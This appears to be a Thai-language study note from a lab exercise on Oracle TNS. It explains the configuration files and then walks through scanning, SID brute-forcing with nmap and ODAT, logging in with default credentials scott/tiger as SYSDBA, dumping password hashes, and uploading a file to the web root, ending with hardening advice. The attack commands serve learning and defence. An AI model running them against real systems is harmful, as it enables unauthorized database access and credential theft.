# Oracle Transparent Network Substrate (TNS)

**Oracle TNS** คือโปรโตคอลสำหรับการสื่อสารที่ทำหน้าที่เชื่อมต่อระหว่างฐานข้อมูล Oracle กับแอปพลิเคชันต่างๆ ผ่านเครือข่าย

## ประวัติและพื้นฐาน
TNS ถูกพัฒนามาเป็นส่วนหนึ่งของชุดซอฟต์แวร์ Oracle Net Services โดยรองรับโปรโตคอลเครือข่ายหลากหลายรูปแบบ เช่น:
- **TCP/IP** (โปรโตคอลหลักที่ใช้กันทั่วไป)
- **IPX/SPX** (โปรโตคอลเก่าของ Novell)

ด้วยความสามารถนี้ TNS จึงเป็นที่นิยมในอุตสาหกรรมที่ต้องจัดการฐานข้อมูลขนาดใหญ่และซับซ้อน เช่น:
- ระบบสุขภาพ (Healthcare)
- การเงิน (Finance)
- ธุรกิจค้าปลีก (Retail)

## ความสามารถหลัก

TNS มีการพัฒนาอย่างต่อเนื่องเพื่อรองรับเทคโนโลยีใหม่ๆ เช่น **IPv6** และการเข้ารหัส **SSL/TLS** โดยมีฟังก์ชันสำคัญดังนี้:

1. **การแปลงชื่อ (Name Resolution)** - แปลงชื่อเซอร์วิสเป็นที่อยู่เครือข่าย
2. **การจัดการการเชื่อมต่อ (Connection Management)** - ควบคุมการเชื่อมต่อระหว่างไคลเอนต์และเซอร์วเวอร์
3. **การกระจายโหลด (Load Balancing)** - กระจายภาระงานไปยังเซอร์วเวอร์หลายตัว
4. **ความปลอดภัย (Security)** - ป้องกันข้อมูลด้วยการเข้ารหัส

## ความปลอดภัย

TNS มีกลไกการเข้ารหัสในตัว (**Built-in Encryption**) ที่:
- เพิ่มชั้นความปลอดภัยเหนือโปรโตคอล TCP/IP
- ป้องกันการเข้าถึงโดยไม่ได้รับอนุญาต
- ป้องกันการโจมตีที่พยายามขโมยข้อมูลระหว่างการส่งผ่านเครือข่าย

คุณสมบัตินี้ทำให้ TNS เหมาะสำหรับองค์กรที่ความปลอดภัยของข้อมูลเป็นสิ่งสำคัญสูงสุด

## เครื่องมือสำหรับผู้ดูแลระบบ

TNS มอบเครื่องมือขั้นสูงสำหรับผู้ดูแลฐานข้อมูล (DBA) และนักพัฒนา ได้แก่:
- **การติดตามและวิเคราะห์ประสิทธิภาพ** (Performance Monitoring & Analysis)
- **การรายงานและบันทึกข้อผิดพลาด** (Error Reporting & Logging)
- **การจัดการภาระงาน** (Workload Management)
- **ความทนทานต่อข้อผิดพลาด** (Fault Tolerance) ผ่าน Database Services

---

**สรุป:** TNS เป็นโปรโตคอลสำคัญที่ทำให้ Oracle Database สามารถทำงานได้อย่างมีประสิทธิภาพ ปลอดภัย และรองรับการใช้งานในองค์กรขนาดใหญ่



# การตั้งค่าเริ่มต้นของ Oracle TNS Server

## การกำหนดค่าพื้นฐาน

การตั้งค่าเริ่มต้นของ Oracle TNS Server จะแตกต่างกันไปตามเวอร์ชันและรุ่นของ Oracle ที่ติดตั้ง แต่มีการตั้งค่าทั่วไปที่มักพบ ได้แก่:

### พอร์ตและโปรโตคอล
- **พอร์ตเริ่มต้น:** TCP/1521 (สามารถเปลี่ยนได้ระหว่างการติดตั้งหรือในไฟล์การตั้งค่า)
- **โปรโตคอลที่รองรับ:** TCP/IP, UDP, IPX/SPX, และ AppleTalk
- **Network Interfaces:** รองรับหลาย interface และสามารถฟังที่ IP address เฉพาะหรือทุก interface ที่มี

### การจัดการระยะไกล (Remote Management)
- **Oracle 8i/9i:** สามารถจัดการระยะไกลได้ตามค่าเริ่มต้น
- **Oracle 10g/11g:** ไม่สามารถจัดการระยะไกลได้ตามค่าเริ่มต้น

## คุณสมบัติด้านความปลอดภัย

TNS Listener มีฟีเจอร์ความปลอดภัยพื้นฐาน:
- ยอมรับการเชื่อมต่อเฉพาะจากโฮสต์ที่ได้รับอนุญาต
- ตรวจสอบสิทธิ์ (Authentication) โดยใช้ชุดของ:
  - Hostnames
  - IP addresses
  - Usernames และ Passwords
- เข้ารหัสการสื่อสารระหว่าง Client และ Server ผ่าน Oracle Net Services

## ไฟล์การตั้งค่าสำคัญ

### 1. tnsnames.ora
**ตำแหน่ง:** `$ORACLE_HOME/network/admin`

ไฟล์นี้เป็น **plain text** ที่เก็บข้อมูลการตั้งค่าสำหรับ:
- Oracle database instances
- Network services ต่างๆ ที่ใช้โปรโตคอล TNS

**ตัวอย่างไฟล์:**
```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

**อธิบาย:**
- **ORCL** = ชื่อของ service
- **HOST = 10.129.11.102** = IP address ของเซอร์วเวอร์
- **PORT = 1521** = พอร์ตที่ใช้
- **SERVICE_NAME = orcl** = ชื่อ service ที่ client ใช้เชื่อมต่อ

ไฟล์นี้สามารถมีหลาย entry สำหรับฐานข้อมูลและ services ต่างๆ รวมถึงข้อมูลเพิ่มเติม เช่น:
- การตั้งค่า Authentication
- Connection pooling
- Load balancing configurations

### 2. listener.ora
**ไฟล์ฝั่ง Server** ที่กำหนดคุณสมบัติและพารามิเตอร์ของ listener process ซึ่งรับผิดชอบ:
- รับ client requests ที่เข้ามา
- ส่งต่อ request ไปยัง Oracle database instance ที่เหมาะสม

**ตัวอย่างไฟล์:**
```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )
```

## บริการที่เกี่ยวข้อง

Oracle TNS มักใช้ร่วมกับบริการ Oracle อื่นๆ เช่น:
- Oracle DBSNMP
- Oracle Databases
- Oracle Application Server
- Oracle Enterprise Manager
- Oracle Fusion Middleware
- Web servers

## ประเด็นด้านความปลอดภัย ⚠️

### รหัสผ่านเริ่มต้น (Default Passwords)
- **Oracle 9:** มีรหัสผ่านเริ่มต้น `CHANGE_ON_INSTALL`
- **Oracle 10:** ไม่มีรหัสผ่านเริ่มต้น
- **Oracle DBSNMP service:** ใช้รหัสผ่านเริ่มต้น `dbsnmp` (ควรจำไว้เพื่อความปลอดภัย)

### ช่องโหว่
องค์กรหลายแห่งยังคงใช้บริการ **finger service** ร่วมกับ Oracle ซึ่งอาจทำให้เกิดความเสี่ยงและช่องโหว่ ถ้าผู้ไม่หวังดีมีความรู้เกี่ยวกับ home directory

---

**คำแนะนำ:** ควรเปลี่ยนรหัสผ่านเริ่มต้นและปิดบริการที่ไม่จำเป็นเพื่อเพิ่มความปลอดภัยให้กับระบบ Oracle TNS


# การทำงานของไฟล์การตั้งค่าและการทดสอบความปลอดภัย Oracle TNS

## การทำงานของไฟล์การตั้งค่า

### ความแตกต่างระหว่าง tnsnames.ora และ listener.ora

**ฝั่ง Client (tnsnames.ora):**
- Oracle Net Services ใช้ไฟล์นี้เพื่อ**แปลง service names เป็น network addresses**
- ช่วยให้ client รู้ว่าจะเชื่อมต่อไปที่ไหน

**ฝั่ง Server (listener.ora):**
- Listener process ใช้ไฟล์นี้เพื่อ**กำหนดว่าจะฟัง services ใดบ้าง**
- ควบคุมพฤติกรรมของ listener

## PL/SQL Exclusion List (PlsqlExclusionList)

เป็นกลไกป้องกันฐานข้อมูล Oracle โดย:

**วิธีการตั้งค่า:**
1. สร้างไฟล์ข้อความ (text file)
2. วางไฟล์ใน directory: `$ORACLE_HOME/sqldeveloper`
3. ระบุชื่อ PL/SQL packages หรือ types ที่ต้องการ**ห้ามเรียกใช้**

**หน้าที่:**
- ทำหน้าที่เป็น **Blacklist** (รายการห้าม)
- ป้องกันไม่ให้เข้าถึงผ่าน Oracle Application Server
- เพิ่มความปลอดภัยโดยจำกัดการเข้าถึง packages ที่อาจเป็นอันตราย

## พารามิเตอร์การตั้งค่าที่สำคัญ

| พารามิเตอร์ | คำอธิบาย |
|------------|---------|
| **DESCRIPTION** | ชื่อและประเภทการเชื่อมต่อของฐานข้อมูล |
| **ADDRESS** | ที่อยู่เครือข่าย (hostname และ port number) |
| **PROTOCOL** | โปรโตคอลเครือข่ายที่ใช้สื่อสาร |
| **PORT** | หมายเลขพอร์ตสำหรับการสื่อสาร |
| **CONNECT_DATA** | คุณสมบัติของการเชื่อมต่อ (service name, SID, protocol) |
| **INSTANCE_NAME** | ชื่อของ database instance ที่ต้องการเชื่อมต่อ |
| **SERVICE_NAME** | ชื่อ service ที่ client ต้องการเชื่อมต่อ |
| **SERVER** | ประเภทเซอร์วเวอร์ (dedicated หรือ shared) |
| **USER** | Username สำหรับ authentication |
| **PASSWORD** | Password สำหรับ authentication |
| **SECURITY** | ประเภทของความปลอดภัยสำหรับการเชื่อมต่อ |
| **VALIDATE_CERT** | ตรวจสอบใบรับรอง SSL/TLS หรือไม่ |
| **SSL_VERSION** | เวอร์ชัน SSL/TLS ที่ใช้ |
| **CONNECT_TIMEOUT** | เวลาจำกัด (วินาที) ในการเชื่อมต่อ |
| **RECEIVE_TIMEOUT** | เวลาจำกัด (วินาที) ในการรับ response |
| **SEND_TIMEOUT** | เวลาจำกัด (วินาที) ในการส่ง request |
| **SQLNET.EXPIRE_TIME** | เวลาจำกัด (วินาที) ในการตรวจจับว่าการเชื่อมต่อล้มเหลว |
| **TRACE_LEVEL** | ระดับของการ tracing |
| **TRACE_DIRECTORY** | Directory สำหรับเก็บ trace files |
| **TRACE_FILE_NAME** | ชื่อของ trace file |
| **LOG_FILE** | ไฟล์สำหรับเก็บข้อมูล log |

## การติดตั้งเครื่องมือทดสอบความปลอดภัย

### ขั้นตอนการติดตั้ง Oracle Instant Client และ ODAT

**ODAT (Oracle Database Attacking Tool)** เป็นเครื่องมือทดสอบการเจาะระบบ (Penetration Testing) แบบ Open-source ที่:
- เขียนด้วยภาษา Python
- ใช้ตรวจสอบและหาช่องโหว่ใน Oracle databases
- สามารถระบุและใช้ประโยชน์จากช่องโหว่ต่างๆ เช่น:
  - **SQL Injection** (การโจมตีผ่าน SQL)
  - **Remote Code Execution** (การรันโค้ดจากระยะไกล)
  - **Privilege Escalation** (การยกระดับสิทธิ์)



```bash
./odat.py -h
```

ถ้าติดตั้งสำเร็จ จะเห็นหน้าจอ help ของ ODAT พร้อมโลโก้:

```
            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------
```



## การสแกนด้วย Nmap

### การสแกนพอร์ต Oracle TNS พื้นฐาน

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

**ผลลัพธ์:**
```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

## System Identifier (SID)

### SID คืออะไร?

**SID (System Identifier)** คือชื่อเฉพาะที่ใช้ระบุ database instance โดยเฉพาะ

**ความสำคัญของ SID:**
- ฐานข้อมูล Oracle สามารถมีหลาย instances ได้ แต่ละ instance มี SID เป็นของตัวเอง
- **Instance** = ชุดของ processes และ memory structures ที่ทำงานร่วมกันเพื่อจัดการข้อมูล
- เมื่อ client เชื่อมต่อ จะต้องระบุ SID ใน connection string
- ถ้าไม่ระบุ SID จะใช้ค่าเริ่มต้นจากไฟล์ `tnsnames.ora`
- ถ้าระบุ SID ผิด การเชื่อมต่อจะล้มเหลว

**การใช้งานของ DBA:**
- ติดตามและจัดการแต่ละ instance
- Start, Stop, หรือ Restart instance
- ปรับแต่ง memory allocation และการตั้งค่าอื่นๆ
- ติดตามประสิทธิภาพด้วยเครื่องมืออย่าง Oracle Enterprise Manager

## การ Brute-force SID

### ใช้ Nmap สแกนหา SID

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

**ผลลัพธ์:**
```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
```

พบ SID: **XE** (Oracle Express Edition)

## การใช้ ODAT สแกนหาข้อมูล

### รันการสแกนแบบครบวงจร

```bash
./odat.py all -s 10.129.204.235
```

**สิ่งที่ ODAT สามารถค้นหาได้:**
- ชื่อฐานข้อมูล
- เวอร์ชัน
- Processes ที่กำลังทำงาน
- User accounts
- ช่องโหว่ (Vulnerabilities)
- การตั้งค่าที่ผิดพลาด (Misconfigurations)

**ผลลัพธ์ตัวอย่าง:**
```
[!] Notice: 'mdsys' account is locked
[!] Notice: 'oracle_ocm' account is locked  
[!] Notice: 'outln' account is locked
[+] Valid credentials found: scott/tiger. Continue...
```

✅ **พบ credentials:** `scott/tiger`

## การเชื่อมต่อด้วย SQLplus

### Login ด้วย User ธรรมดา

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

**ผลลัพธ์:**
```
SQL*Plus: Release 21.0.0.0.0 - Production
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

ERROR:
ORA-28002: the password will expire within 7 days
```

⚠️ แจ้งเตือน: รหัสผ่านจะหมดอายุภายใน 7 วัน

### แก้ไขปัญหา Shared Libraries

หากเกิด error: `libsqlplus.so: cannot open shared object file`

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

## การสำรวจฐานข้อมูล

### ดูตารางทั้งหมด

```sql
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
...
```

### ตรวจสอบสิทธิ์ของ User

```sql
SQL> select * from user_role_privs;

USERNAME    GRANTED_ROLE    ADM DEF OS_
----------- --------------- --- --- ---
SCOTT       CONNECT         NO  YES NO
SCOTT       RESOURCE        NO  YES NO
```

ผลลัพธ์: User `scott` **ไม่มีสิทธิ์ผู้ดูแลระบบ** (administrative privileges)

## การยกระดับสิทธิ์ (Privilege Escalation)

### Login เป็น SYSDBA

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

**SYSDBA** = System Database Admin (สิทธิ์สูงสุด)

### ตรวจสอบสิทธิ์หลัง Login เป็น SYSDBA

```sql
SQL> select * from user_role_privs;

USERNAME    GRANTED_ROLE                ADM DEF OS_
----------- --------------------------- --- --- ---
SYS         ADM_PARALLEL_EXECUTE_TASK   YES YES NO
SYS         APEX_ADMINISTRATOR_ROLE     YES YES NO
SYS         DBA                         YES YES NO
SYS         DATAPUMP_EXP_FULL_DATABASE  YES YES NO
...
```

✅ **ได้สิทธิ์ระดับสูง!** รวมถึง DBA role

## การดึงข้อมูลที่สำคัญ

### ดึง Password Hashes

```sql
SQL> select name, password from sys.user$;

NAME        PASSWORD
----------- ------------------------------
SYS         FBA343E7D6C8BC9D
SYSTEM      B5073FE1DE351687
OUTLN       4A3BA55E08595C81
...
```

**การนำไปใช้:**
- นำ password hashes ไป crack แบบ offline
- ใช้เครื่องมืออย่าง John the Ripper หรือ Hashcat

## การอัปโหลดไฟล์ (File Upload)

### เส้นทาง Web Root ตามระบบปฏิบัติการ

| ระบบปฏิบัติการ | เส้นทาง |
|----------------|---------|
| **Linux** | `/var/www/html` |
| **Windows** | `C:\inetpub\wwwroot` |

### ทดสอบการอัปโหลด

**1. สร้างไฟล์ทดสอบ:**
```bash
echo "Oracle File Upload Test" > testing.txt
```

**2. อัปโหลดด้วย ODAT:**
```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba \
  --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

**ผลลัพธ์:**
```
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory
```

**3. ตรวจสอบด้วย curl:**
```bash
curl -X GET http://10.129.204.235/testing.txt
```

**ผลลัพธ์:**
```
Oracle File Upload Test
```

✅ **สำเร็จ!** สามารถอัปโหลดไฟล์ได้

## ขั้นตอนการโจมตีโดยสรุป

```
1. สแกนพอร์ต (Nmap) → ตรวจสอบ TNS listener
2. Brute-force SID → หา database instance name
3. สแกนหา credentials (ODAT) → หา username/password
4. เชื่อมต่อ (SQLplus) → login เข้าฐานข้อมูล
5. ยกระดับสิทธิ์ → login เป็น SYSDBA
6. ดึงข้อมูล → password hashes, sensitive data
7. อัปโหลด web shell → สำหรับ remote access
```


## การป้องกัน

**ผู้ดูแลระบบควร:**
1. ✅ เปลี่ยนรหัสผ่านเริ่มต้น
2. ✅ ใช้รหัสผ่านที่แข็งแรง
3. ✅ จำกัด IP ที่สามารถเข้าถึง TNS listener
4. ✅ ปิดการใช้งาน accounts ที่ไม่จำเป็น
5. ✅ อัปเดต patch ความปลอดภัยสม่ำเสมอ
6. ✅ ติดตาม logs และ audit trails
